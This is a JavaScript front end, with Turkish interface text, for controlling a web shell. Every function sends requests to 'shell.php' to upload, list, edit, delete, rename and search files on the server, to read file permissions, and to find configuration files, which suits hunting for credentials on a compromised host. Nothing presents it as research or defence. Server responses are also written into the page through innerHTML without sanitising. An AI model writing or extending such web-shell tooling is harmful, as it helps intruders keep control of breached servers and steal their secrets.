function uploadFile() {
    var formData = new FormData();
    var file = document.getElementById("fileInput").files[0];
    formData.append("file", file);

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "shell.php", true);
    xhr.onload = function() {
        if (xhr.status == 200) {
            alert("Dosya başarıyla yüklendi!");
            listFiles();
        } else {
            alert("Dosya yüklenirken bir hata oluştu!");
        }
    };
    xhr.onerror = function() {
        alert("Sunucuya bağlanılamadı!");
    };
    xhr.send(formData);
}

function listFiles() {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "shell.php?action=list", true);
    xhr.onload = function() {
        if (xhr.status == 200) {
            document.getElementById("files").innerHTML = xhr.responseText;
        } else {
            alert("Dosya listelenirken bir hata oluştu!");
        }
    };
    xhr.onerror = function() {
        alert("Sunucuya bağlanılamadı!");
    };
    xhr.send();
}

function deleteFile(fileName) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "shell.php", true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.onload = function() {
        if (xhr.status == 200) {
            alert(xhr.responseText);
            listFiles();
        } else {
            alert("Dosya silinirken bir hata oluştu!");
        }
    };
    xhr.onerror = function() {
        alert("Sunucuya bağlanılamadı!");
    };
    xhr.send("action=delete&file=" + encodeURIComponent(fileName));
}

function editFile(fileName) {
    var content = prompt("Yeni içerik girin:");
    if (content !== null) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "shell.php", true);
        xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhr.onload = function() {
            if (xhr.status == 200) {
                alert(xhr.responseText);
                listFiles();
            } else {
                alert("Dosya düzenlenirken bir hata oluştu!");
            }
        };
        xhr.onerror = function() {
            alert("Sunucuya bağlanılamadı!");
        };
        xhr.send("action=edit&file=" + encodeURIComponent(fileName) + "&content=" + encodeURIComponent(content));
    }
}

function viewPermissions(fileName) {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "shell.php?action=permissions&file=" + encodeURIComponent(fileName), true);
    xhr.onload = function() {
        if (xhr.status == 200) {
            alert(xhr.responseText);
        } else {
            alert("Dosya izinleri alınırken bir hata oluştu!");
        }
    };
    xhr.onerror = function() {
        alert("Sunucuya bağlanılamadı!");
    };
    xhr.send();
}

function findConfigFiles() {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "shell.php?action=find_config", true);
    xhr.onload = function() {
        if (xhr.status == 200) {
            alert(xhr.responseText);
        } else {
            alert("Konfigürasyon dosyaları aranırken bir hata oluştu!");
        }
    };
    xhr.onerror = function() {
        alert("Sunucuya bağlanılamadı!");
    };
    xhr.send();
}

function searchFiles() {
    var query = prompt("Aramak istediğiniz dosya adını veya kalıbını girin:");
    if (query !== null && query.trim() !== '') {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "shell.php?action=search&query=" + encodeURIComponent(query), true);
        xhr.onload = function() {
            if (xhr.status == 200) {
                alert(xhr.responseText);
            } else {
                alert("Dosya aranırken bir hata oluştu!");
            }
        };
        xhr.onerror = function() {
            alert("Sunucuya bağlanılamadı!");
        };
        xhr.send();
    } else {
        alert("Geçerli bir arama kriteri girin.");
    }
}

function renameFile(oldName) {
    var newName = prompt("Yeni dosya adını girin:");
    if (newName !== null && newName.trim() !== '') {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "shell.php", true);
        xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhr.onload = function() {
            if (xhr.status == 200) {
                alert(xhr.responseText);
                listFiles();
            } else {
                alert("Dosya yeniden adlandırılırken bir hata oluştu!");
            }
        };
        xhr.onerror = function() {
            alert("Sunucuya bağlanılamadı!");
        };
        xhr.send("action=rename&old_name=" + encodeURIComponent(oldName) + "&new_name=" + encodeURIComponent(newName));
    } else {
        alert("Geçerli bir dosya adı girin.");
    }
}

function showHelp() {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "shell.php?action=help", true);
    xhr.onload = function() {
        if (xhr.status == 200) {
            var helpDiv = document.createElement("div");
            helpDiv.innerHTML = xhr.responseText;
            helpDiv.style.position = "fixed";
            helpDiv.style.top = "50%";
            helpDiv.style.left = "50%";
            helpDiv.style.transform = "translate(-50%, -50%)";
            helpDiv.style.backgroundColor = "#fff";
            helpDiv.style.padding = "20px";
            helpDiv.style.border = "1px solid #ccc";
            helpDiv.style.boxShadow = "0px 0px 10px rgba(0, 0, 0, 0.1)";
            helpDiv.style.zIndex = "1000";

            var closeButton = document.createElement("button");
            closeButton.textContent = "Kapat";
            closeButton.onclick = function() {
                document.body.removeChild(helpDiv);
            };
            helpDiv.appendChild(closeButton);

            document.body.appendChild(helpDiv);
        } else {
            alert("Yardım bilgisi alınırken bir hata oluştu!");
        }
    };
    xhr.onerror = function() {
        alert("Sunucuya bağlanılamadı!");
    };
    xhr.send();
}

window.onload = listFiles;
